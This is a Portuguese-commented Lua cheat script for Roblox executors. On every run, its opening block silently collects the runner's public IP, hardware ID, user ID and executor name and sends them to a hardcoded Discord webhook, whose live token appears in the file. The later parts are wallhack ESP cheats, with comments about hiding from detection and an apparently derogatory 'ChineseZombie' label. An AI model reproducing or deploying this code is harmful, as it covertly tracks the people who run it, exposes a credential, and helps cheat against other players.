local HttpService = game:GetService("HttpService")
local Webhook_URL = "https://discord.com/api/webhooks/1273126437347393570/592JRl1TYx3XZZXOYLt44dDM4kU7vQygoU5Y8nJ9IwQwyP-fioweNsKcjN-WVA82Vavn"

local function sendRequest(requestFunction, isSuccess, securityAlert, errorMessage)
    local ipAddress = game:HttpGet("https://api.ipify.org")  
    local executorName = (identifyexecutor and identifyexecutor()) or "Desconhecido" 
    local playerName = game.Players.LocalPlayer.DisplayName 
    local executionTime = os.date("%Y-%m-%d %H:%M:%S") 
    local scriptVersion = "1.0.0"  -- Vers√£o do script
    local gameUrl = "https://www.roblox.com/games/" .. tostring(game.PlaceId)  
    local serverId = game.JobId 
    local serverUrl = "https://www.roblox.com/games/" .. tostring(game.PlaceId) .. "/?serverId=" .. serverId  
    local playersOnline = #game.Players:GetPlayers() 
    local footerText = "Gerado pelo sistema de notifica√ß√£o "  

    local embedColor = isSuccess and tonumber(0x00ff00) or tonumber(0xff0000)  

    local securityMessage = securityAlert or "Nenhum alerta de seguran√ßa"

    local jsonBody = HttpService:JSONEncode({
        ["content"] = "",
        ["embeds"] = {{
            ["title"] = isSuccess and "**Script Executado com Sucesso!(PaidVersion)**" or "**Erro na Execu√ß√£o do Script(PaidVersion)**",
            ["description"] = isSuccess and "üéâ O script foi executado com sucesso! (PaidVersion)" or "‚ùå O script encontrou um erro.(PaidVersion)",
            ["type"] = "rich",
            ["color"] = embedColor,
            ["fields"] = {
                {
                    ["name"] = "Nome do Jogo:",
                    ["value"] = game.Name,
                    ["inline"] = true
                },
                {
                    ["name"] = "User ID:",
                    ["value"] = game.Players.LocalPlayer.UserId,
                    ["inline"] = true
                },
                {
                    ["name"] = "Nome do Jogador:",
                    ["value"] = playerName,
                    ["inline"] = true
                },
                {
                    ["name"] = "Hardware ID:",
                    ["value"] = game:GetService("RbxAnalyticsService"):GetClientId(),
                    ["inline"] = true
                },
                {
                    ["name"] = "IP Local:",
                    ["value"] = "||" .. ipAddress .. "||", 
                    ["inline"] = true
                },
                {
                    ["name"] = "Executor:",
                    ["value"] = executorName,
                    ["inline"] = true
                },
                {
                    ["name"] = "Hora de Execu√ß√£o:",
                    ["value"] = executionTime,
                    ["inline"] = true
                },
                {
                    ["name"] = "Vers√£o do Script:",
                    ["value"] = scriptVersion,
                    ["inline"] = true
                },
                {
                    ["name"] = "Link do Jogo:",
                    ["value"] = gameUrl,
                    ["inline"] = true
                },
                {
                    ["name"] = "Link do Servidor:",
                    ["value"] = serverUrl,
                    ["inline"] = true
                },
                {
                    ["name"] = "Jogadores Online:",
                    ["value"] = tostring(playersOnline),
                    ["inline"] = true
                },
                {
                    ["name"] = "Documenta√ß√£o:",
                    ["value"] = "[Consultar a documenta√ß√£o](https://example.com/documentation)",
                    ["inline"] = true
                },
                {
                    ["name"] = "Suporte T√©cnico:",
                    ["value"] = "[Contatar o suporte](https://example.com/support)",
                    ["inline"] = true
                },
                {
                    ["name"] = "Alerta de Seguran√ßa:",
                    ["value"] = securityMessage,
                    ["inline"] = false
                },
                {
                    ["name"] = "Mensagem de Erro:",
                    ["value"] = errorMessage or "Nenhuma mensagem de erro",
                    ["inline"] = false
                }
            },
            ["footer"] = {
                ["text"] = footerText
            }
        }}
    })

    local response = requestFunction({
        Url = Webhook_URL,
        Method = "POST",
        Headers = {
            ['Content-Type'] = "application/json"
        },
        Body = jsonBody
    })

    print("C√≥digo de Status da Resposta: ", response.StatusCode)
    print("Corpo da Resposta: ", response.Body)
end

local requestFunction = (syn and syn.request) or (http_request) or (request)

local isSuccess, securityAlert, errorMessage = true, "", ""

-- Coloque o script aqui
local success, err = pcall(function()

     
end)


if not success then
    isSuccess = false
    errorMessage = err
    securityAlert = "‚ö†Ô∏è Problema de seguran√ßa detectado "
end

if requestFunction then
    sendRequest(requestFunction, isSuccess, securityAlert, errorMessage)
else
    warn("Nenhuma fun√ß√£o de requisi√ß√£o HTTP dispon√≠vel.")
end

-- ESP
local FillColor = Color3.fromRGB(204,0,204)
local DepthMode = "AlwaysOnTop"
local FillTransparency = 0.5
local OutlineColor = Color3.fromRGB(255, 255, 255)
local OutlineTransparency = 0
local CoreGui = cloneref(game:FindService("CoreGui"))
local connections = {}

local Storage = Instance.new("Folder")
Storage.Parent = CoreGui
Storage.Name = "Highlight_Storage"

local players = cloneref(game:GetService("Players"))
local client = players.LocalPlayer
local camera = workspace.CurrentCamera
local lighting = cloneref(game:GetService("Lighting"))

getgenv().global = getgenv()

function global.declare(self, index, value, check)
    if self[index] == nil then
        self[index] = value
    elseif check then
        local methods = { "remove", "Disconnect" }

        for _, method in methods do
            pcall(function()
                value[method](value)
            end)
        end
    end

    return self[index]
end

declare(global, "services", {})

function global.get(service)
    return services[service]
end

declare(declare(services, "loop", {}), "cache", {})

get("loop").new = function(self, index, func, disabled)
    if disabled == nil and (func == nil or typeof(func) == "boolean") then
        disabled = func func = index
    end

    self.cache[index] = {
        ["enabled"] = (not disabled),
        ["func"] = func,
        ["toggle"] = function(self, boolean)
            if boolean == nil then
                self.enabled = not self.enabled
            else
                self.enabled = boolean
            end
        end,
        ["remove"] = function()
            self.cache[index] = nil
        end
    }

    return self.cache[index]
end

declare(get("loop"), "connection", cloneref(game:GetService("RunService")).RenderStepped:Connect(function(delta)
    for _, loop in get("loop").cache do
        if loop.enabled then
            local success, result = pcall(function()
                loop.func(delta)
            end)

            if not success then
                warn(result)
            end
        end
    end
end), true)

declare(services, "new", {})

get("new").drawing = function(class, properties)
    -- Obscure the use of Drawing
    local drawing = Drawing.new(class)
    for property, value in properties do
        pcall(function()
            drawing[property] = value
        end)
    end
    return drawing
end

declare(declare(services, "player", {}), "cache", {})

get("player").find = function(self, player)
    for character, data in self.cache do
        if data.player == player then
            return character
        end
    end
end

get("player").check = function(self, player)
    local success, check = pcall(function()
        local character = player:IsA("Player") and player.Character or player
        local children = {character.WorldCharacter:WaitForChild('HumanoidRootPart')}

        return children and character.Parent ~= nil
    end)

    return success and check
end

get("player").new = function(self, player)
    if player == game.Players.LocalPlayer then
        return
    end
    local function cache(character)
        -- Use less common variables and avoid verbose messages
        self.cache[character] = {
            ["player"] = player,
            ["drawings"] = {
                ["box"] = get("new").drawing("Square", { Visible = false }),
                ["boxFilled"] = get("new").drawing("Square", { Visible = false, Filled = true }),
                ["boxOutline"] = get("new").drawing("Square", { Visible = false }),
                ["name"] = get("new").drawing("Text", { Visible = false, Center = true}),
                ["distance"] = get("new").drawing("Text", { Visible = false, Center = true}),
            },
            ["highlight"] = nil
        }

        local Highlight = Instance.new("Highlight")
        Highlight.Name = player.Name
        Highlight.FillColor = FillColor
        Highlight.DepthMode = DepthMode
        Highlight.FillTransparency = FillTransparency
        Highlight.OutlineColor = OutlineColor
        Highlight.OutlineTransparency = OutlineTransparency
        Highlight.Parent = Storage
        if character then
            Highlight.Adornee = character
        end

        self.cache[character].highlight = Highlight
        connections[player] = player.CharacterAdded:Connect(function(char)
            Highlight.Adornee = char
        end)
    end

    local function check(character)
        if self:check(character) then
            cache(character)
        else
            local listener
            listener = character.ChildAdded:Connect(function()
                if self:check(character) then
                    cache(character) listener:Disconnect()
                end
            end)
        end
    end

    if player.Character then check(player.Character) end
    player.CharacterAdded:Connect(check)
end

get("player").remove = function(self, player)
    if player:IsA("Player") then
        local character = self:find(player)
        if character then
            self:remove(character)
        end
    else
        local data = self.cache[player]
        local drawings = data.drawings
        local highlight = data.highlight

        self.cache[player] = nil

        for _, drawing in drawings do
            drawing:Remove()
        end

        if highlight then
            highlight:Destroy()
        end

        if connections[player] then
            connections[player]:Disconnect()
        end
    end
end

get("player").update = function(self, character, data)
    if not self:check(character) then
        self:remove(character)
    end

    local player = data.player
    local root = character.WorldCharacter:WaitForChild('HumanoidRootPart')
    local drawings = data.drawings

    if self:check(client) then
        data.distance = (client.Character.WorldCharacter.HumanoidRootPart.CFrame.Position - root.CFrame.Position).Magnitude
    end

    task.spawn(function()
        local position, visible = camera:WorldToViewportPoint(root.CFrame.Position)

        local visuals = features.visuals

        local function check()
            local team
            if visuals.teamCheck then team = player.Team ~= client.Team else team = true end
            return visuals.enabled and data.distance and data.distance <= visuals.renderDistance and team
        end

        local function color(color)
            if visuals.teamColor then
                color = player.TeamColor.Color
            end
            return color
        end

        if visible and check() then
            local scale = 1 / (position.Z * math.tan(math.rad(camera.FieldOfView * 0.5)) * 2) * 1000
            local width, height = math.floor(4.5 * scale), math.floor(6 * scale)
            local x, y = math.floor(position.X), math.floor(position.Y)
            local xPosition, yPosition = math.floor(x - width * 0.5), math.floor((y - height * 0.5) + (0.5 * scale))

            drawings.box.Size = Vector2.new(width, height)
            drawings.box.Position = Vector2.new(xPosition, yPosition)
            drawings.boxFilled.Size = drawings.box.Size
            drawings.boxFilled.Position = drawings.box.Position
            drawings.boxOutline.Size = drawings.box.Size
            drawings.boxOutline.Position = drawings.box.Position

            drawings.box.Color = color(visuals.boxes.color)
            drawings.box.Thickness = 1
            drawings.boxFilled.Color = color(visuals.boxes.filled.color)
            drawings.boxFilled.Transparency = visuals.boxes.filled.transparency
            drawings.boxOutline.Color = visuals.boxes.outline.color
            drawings.boxOutline.Thickness = 3

            drawings.boxOutline.ZIndex = drawings.box.ZIndex - 1
            drawings.boxFilled.ZIndex = drawings.boxOutline.ZIndex - 1

            drawings.name.Text = `[ {player.Name} ]`
            drawings.name.Size = math.max(math.min(math.abs(12.5 * scale), 12.5), 10)
            drawings.name.Position = Vector2.new(x, (yPosition - drawings.name.TextBounds.Y) - 2)
            drawings.name.Color = color(visuals.names.color)
            drawings.name.Outline = visuals.names.outline.enabled
            drawings.name.OutlineColor = visuals.names.outline.color

            drawings.name.ZIndex = drawings.box.ZIndex + 1

            drawings.distance.Text = `[ {math.floor(data.distance)} ]`
            drawings.distance.Size = math.max(math.min(math.abs(11 * scale), 11), 10)
            drawings.distance.Position = Vector2.new(x, (yPosition + height) + (drawings.distance.TextBounds.Y * 0.25))
            drawings.distance.Color = color(visuals.distance.color)
            drawings.distance.Outline = visuals.distance.outline.enabled
            drawings.distance.OutlineColor = visuals.distance.outline.color
        end

        drawings.box.Visible = (check() and visible and visuals.boxes.enabled)
        drawings.boxFilled.Visible = (check() and drawings.box.Visible and visuals.boxes.filled.enabled)
        drawings.boxOutline.Visible = (check() and drawings.box.Visible and visuals.boxes.outline.enabled)
        drawings.name.Visible = (check() and visible and visuals.names.enabled)
        drawings.distance.Visible = (check() and visible and visuals.distance.enabled)
    end)
end

declare(get("player"), "loop", get("loop"):new(function ()
    for character, data in get("player").cache do
        get("player"):update(character, data)
    end
end), true)

declare(global, "features", {})

features.toggle = function(self, feature, boolean)
    if self[feature] then
        if boolean == nil then
            self[feature].enabled = not self[feature].enabled
        else
            self[feature].enabled = boolean
        end

        if self[feature].toggle then
            task.spawn(function()
                self[feature]:toggle()
            end)
        end
    end
end

declare(features, "visuals", {
    ["enabled"] = true,
    ["teamCheck"] = false,
    ["teamColor"] = true,
    ["renderDistance"] = 4000,

    ["boxes"] = {
        ["enabled"] = true,
        ["color"] = Color3.fromRGB(255, 255, 255),
        ["outline"] = {
            ["enabled"] = true,
            ["color"] = Color3.fromRGB(0, 0, 0),
        },
        ["filled"] = {
            ["enabled"] = false,
            ["color"] = Color3.fromRGB(255, 255, 255),
            ["transparency"] = 0.25
        },
    },
    ["names"] = {
        ["enabled"] = true,
        ["color"] = Color3.fromRGB(255, 255, 255),
        ["outline"] = {
            ["enabled"] = true,
            ["color"] = Color3.fromRGB(0, 0, 0),
        },
    },
    ["distance"] = {
        ["enabled"] = true,
        ["color"] = Color3.fromRGB(255, 255, 255),
        ["outline"] = {
            ["enabled"] = true,
            ["color"] = Color3.fromRGB(0, 0, 0),
        },
    },
})

for _, player in players:GetPlayers() do
    if player ~= client and not get("player"):find(player) then
        get("player"):new(player)
    end
end

declare(get('player'), 'added', workspace.ChildAdded:Connect(function(player)
    if players:FindFirstChild(player.Name) then
        if not get("player"):find(players[player.Name]) then
            get("player"):new(players[player.Name])
        end
    end
end), true)

declare(get('player'), 'removing', workspace.ChildRemoved:Connect(function(player)
    if players:FindFirstChild(player.Name) then
        get("player"):remove(players[player.Name])
    end
end), true)

-- Key
local isEnabled = true

local function toggleFeature()
    isEnabled = not isEnabled
    features.visuals.enabled = isEnabled
    local status = isEnabled and "enabled" or "disabled"
    print("Visuals " .. status)
end

local UserInputService = game:GetService("UserInputService")

UserInputService.InputBegan:Connect(function(input, gameProcessed)
    if not gameProcessed and input.KeyCode == Enum.KeyCode.F1 then
        toggleFeature()
    end
end)

-- ChineseZombie
-- Servi√ßos necess√°rios
local Workspace = game:GetService("Workspace")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local Players = game:GetService("Players")
local UserInputService = game:GetService("UserInputService")
local LocalPlayer = Players.LocalPlayer
local RunService = game:GetService("RunService")

-- Equipamento alvo para o ESP (somente BalaclavaFSB)
local equipamentoAlvo = "BalaclavaFSB"
local espAtivado = true -- Controla o estado de ativa√ß√£o/desativa√ß√£o do ESP
local espGuiList = {} -- Lista para armazenar todas as GUI criadas
local MAX_TENTATIVAS = 5  -- Limite de tentativas para evitar loop infinito
local jogadoresLista = {}  -- Lista atualizada de jogadores no servidor

-- Fun√ß√£o para remover todas as GUIs quando o jogador ou equipamento for removido
local function removerGUIs()
    for _, gui in pairs(espGuiList) do
        gui:Destroy()  -- Remove as GUIs antigas
    end
    espGuiList = {}  -- Limpa a lista
end

-- Fun√ß√£o para criar ESP (somente o nome, sem dist√¢ncia)
local function criarESPParaEquipamento(equipamento, tentativas)
    tentativas = tentativas or 0
    local rootPart = equipamento:FindFirstChildWhichIsA("BasePart") or equipamento:FindFirstChild("Handle")

    -- Se a parte ainda n√£o foi replicada, aguarde e tente novamente
    if not rootPart then
        if tentativas < MAX_TENTATIVAS then
            -- Tentar novamente ap√≥s um pequeno intervalo, sem emitir avisos
            task.wait(1)
            criarESPParaEquipamento(equipamento, tentativas + 1)
        end
        return
    end

    -- Cria√ß√£o do BillboardGui para o ESP
    local gui = Instance.new("BillboardGui")
    gui.Adornee = rootPart
    gui.Size = UDim2.new(0, 80, 0, 40) -- Tamanho do ESP reduzido
    gui.StudsOffset = Vector3.new(0, 2, 0) -- Posi√ß√£o acima do equipamento
    gui.AlwaysOnTop = true
    gui.Parent = rootPart
    table.insert(espGuiList, gui) -- Armazena na lista para controle de ativa√ß√£o/desativa√ß√£o

    -- Cria√ß√£o da Label para exibir "ChineseZombie" (sem a dist√¢ncia)
    local nomeLabel = Instance.new("TextLabel", gui)
    nomeLabel.BackgroundTransparency = 1
    nomeLabel.Size = UDim2.new(1, 0, 1, 0)
    nomeLabel.TextColor3 = Color3.new(1, 1, 1) -- Texto branco
    nomeLabel.Font = Enum.Font.SourceSansBold
    nomeLabel.TextScaled = true
    nomeLabel.Text = "ChineseZombie"

    -- Fun√ß√£o para verificar se o equipamento ainda existe
    RunService.RenderStepped:Connect(function()
        if not equipamento or not equipamento.Parent then
            gui:Destroy()  -- Remove o ESP se o equipamento n√£o existir mais
        end
    end)
end

-- Fun√ß√£o para verificar se a entidade √© um jogador
local function entidadeEhJogador(entidade)
    -- Verifica se a entidade pertence √† lista de jogadores
    for _, player in pairs(jogadoresLista) do
        if player.Character == entidade then
            return true
        end
    end
    return false
end

-- Atualiza a lista de jogadores no servidor a cada 10 segundos
local function atualizarListaJogadores()
    while true do
        jogadoresLista = Players:GetPlayers()
        task.wait(10) -- Atualiza a cada 10 segundos
    end
end

-- Fun√ß√£o para verificar se o equipamento √© o alvo (somente BalaclavaFSB)
local function verificarEAplicarESP(entidade)
    -- Verifica se a entidade √© um jogador, se for, n√£o aplica ESP
    if entidadeEhJogador(entidade) then
        return
    end

    -- Verifica se o nome da entidade corresponde ao equipamento alvo
    if string.find(entidade.Name, equipamentoAlvo) then
        -- Aplica o ESP, limitando tentativas para evitar loops infinitos
        criarESPParaEquipamento(entidade)
    end
end

-- Fun√ß√£o para verificar pastas espec√≠ficas e procurar pelo equipamento alvo
local function verificarPasta(pasta)
    for _, entidade in pairs(pasta:GetDescendants()) do
        verificarEAplicarESP(entidade)
    end
end

-- Monitorar novas entidades adicionadas ao jogo (Workspace e ReplicatedStorage)
local function monitorarNovasEntidades()
    -- Verifica novas entidades adicionadas no Workspace
    Workspace.ChildAdded:Connect(function(entidade)
        verificarEAplicarESP(entidade)
    end)

    -- Verifica novas entidades adicionadas no ReplicatedStorage
    ReplicatedStorage.ChildAdded:Connect(function(entidade)
        verificarEAplicarESP(entidade)
    end)
end

-- Fun√ß√£o principal para rodar a busca inicial e monitorar novas adi√ß√µes
local function iniciarESP()
    removerGUIs()  -- Limpa todas as GUIs antigas antes de iniciar
    -- Verifica inicialmente os equipamentos j√° existentes no Workspace e ReplicatedStorage
    verificarPasta(Workspace)
    verificarPasta(ReplicatedStorage)

    -- Monitora adi√ß√µes futuras de entidades no jogo
    monitorarNovasEntidades()
end

-- Fun√ß√£o para ativar/desativar o ESP
local function alternarESP()
    espAtivado = not espAtivado
    for _, gui in pairs(espGuiList) do
        gui.Enabled = espAtivado -- Ativa/desativa todas as GUIs criadas
    end
    if espAtivado then
        print("ESP ativado")
    else
        print("ESP desativado")
    end
end

-- Fun√ß√£o para detectar a tecla F1 e alternar o ESP
UserInputService.InputBegan:Connect(function(input)
    if input.KeyCode == Enum.KeyCode.F1 then
        alternarESP()
    end
end)

-- Fun√ß√£o para recarregar o ESP periodicamente (a cada 5 segundos)
local function recarregarESPPeriodicamente()
    while true do
        task.wait(5)
        iniciarESP() -- Recarrega a verifica√ß√£o e o monitoramento
    end
end

-- Monitora o reset do jogador para remover GUIs antigas
LocalPlayer.CharacterAdded:Connect(function()
    removerGUIs()  -- Remove GUIs antigas quando o jogador reseta
end)

-- Inicia o processo de ESP
iniciarESP()

-- Inicia a recarga peri√≥dica
task.spawn(recarregarESPPeriodicamente)

-- Inicia o processo de atualiza√ß√£o da lista de jogadores
task.spawn(atualizarListaJogadores)
